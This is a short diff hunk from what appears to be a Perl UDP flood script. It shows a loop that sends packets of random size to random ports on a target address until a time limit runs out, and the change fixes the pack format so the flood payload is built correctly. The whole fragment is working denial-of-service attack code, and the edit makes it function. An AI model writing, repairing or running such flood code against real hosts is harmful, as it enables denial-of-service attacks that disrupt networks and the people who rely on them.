@@ -27,4 +27,4 @@ for (;time() <= $endtime;) {
   $psize = $size ? $size : int(rand(1500-64)+64) ;
   $pport = $port ? $port : int(rand(65500))+1;
  
-  send(flood, pack("$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
+  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
